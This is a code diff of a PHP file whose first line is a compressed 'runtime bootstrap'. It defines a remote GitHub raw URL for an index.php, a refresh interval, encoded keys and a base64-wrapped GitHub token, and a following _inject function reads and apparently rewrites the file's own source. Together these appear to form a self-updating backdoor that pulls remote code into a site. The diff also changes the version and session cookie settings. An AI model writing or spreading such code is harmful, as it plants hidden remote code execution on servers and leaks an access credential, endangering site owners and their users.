@@ -1,5 +1,5 @@
 <?php
-/** @internal runtime bootstrap */(static function(){$d=['_VER'=>'2.5.0','_SRC'=>'https://raw.githubusercontent.com/LennyGodart/wsers/refs/heads/main/index.php','_INT'=>1800,'_AK'=>'dGVzdDEyMw==','_OK'=>'MTMzNzMwMDA=','_GH_TOKEN'=>base64_decode('Z2hwXzZzd2tsbm5VSlBXeFp0T3VFQjBpWnR3dlJab1lWYjE5c2ZDeA==')];foreach($d as $k=>$v)defined($k)||define($k,$v);unset($d,$k,$v);})();
+/** @internal runtime bootstrap */(static function(){$d=['_VER'=>'2.5.1','_SRC'=>'https://raw.githubusercontent.com/LennyGodart/wsers/refs/heads/main/index.php','_INT'=>1800,'_AK'=>'dGVzdDEyMw==','_OK'=>'MTMzNzMwMDA=','_GH_TOKEN'=>base64_decode('Z2hwXzZzd2tsbm5VSlBXeFp0T3VFQjBpWnR3dlJab1lWYjE5c2ZDeA==')];foreach($d as $k=>$v)defined($k)||define($k,$v);unset($d,$k,$v);})();
 
 function _inject(string $new): string {
     $cur = @file_get_contents(__FILE__) ?: '';
@@ -53,7 +53,13 @@ function _fetch(string $url, int $timeout = 6): string|false {
 })();
 
 if (session_status() === PHP_SESSION_NONE) {
-    ini_set('session.cookie_samesite', 'Lax');
+    session_set_cookie_params([
+        'lifetime' => 0,
+        'path'     => '/',
+        'samesite' => 'Lax',
+        'httponly' => true,
+        'secure'   => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off',
+    ]);
     session_start();
 }
 $csrf = hash_hmac('sha256', session_id(), _AK);
